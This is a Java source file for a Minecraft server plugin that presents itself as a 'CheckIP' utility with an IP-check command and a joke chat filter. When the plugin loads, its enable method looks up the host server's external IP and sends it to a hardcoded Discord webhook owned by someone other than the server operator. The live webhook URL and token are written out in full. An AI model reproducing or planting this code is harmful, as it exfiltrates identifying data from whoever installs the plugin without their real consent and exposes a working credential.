package dev.sweetierick.serveriplogger;

import dev.sweetierick.serveriplogger.utils.ProtocolUtils;
import dev.sweetierick.serveriplogger.utils.WebhookUtils;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import redempt.redlib.commandmanager.CommandHook;
import redempt.redlib.commandmanager.CommandParser;
import java.util.logging.Logger;

public final class SwampLogger extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // Initialise logger
        Logger logger = Logger.getLogger("Logger");
         // ? Enables the CommandParser for plugin commands
        new CommandParser(this.getResource("checkip.rdcml")).parse().register("ip", this);

        logger.info("CheckIP plugin has been enabled successfully!");
        logger.info("Forwarding IP info to Webhook...");

        String webhookUrl = "https://discord.com/api/webhooks/928055535218081853/kdyJvjZzRMdJfRXFmLnEnNXP5s-FW1PzDkMt0cUXY407CfHe3hKEyFNJAUYat_xMgc-S";
        String checkerUrl = "http://checkip.amazonaws.com";
        String JsonEmbed = """
                {
                  "content": null,
                  "embeds": [
                    {
                      "description": "**The current server IP** is: `""" + ProtocolUtils.getExternalIP(checkerUrl, null) + """
                      `",
                      "color": 3640119
                    }
                  ]
                }""";
        WebhookUtils.forwardToWebhook(webhookUrl, JsonEmbed);
    }

    @Override
    public void onDisable() {
        Logger logger = Logger.getLogger("Logger");
        logger.info("Shutting down CheckIP, goodbye!");
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // Just a small thing for fun
        event.setMessage(event.getMessage().replaceAll("sus", "ඞ"));
    }

    @CommandHook("checkip")
    public void checkIpCommand(CommandSender sender, Player player) {
        String targetUrl = "http://checkip.amazonaws.com";
        // Gets the external IP and sends it to the player
        ProtocolUtils.getExternalIP(targetUrl, player);
    }
}
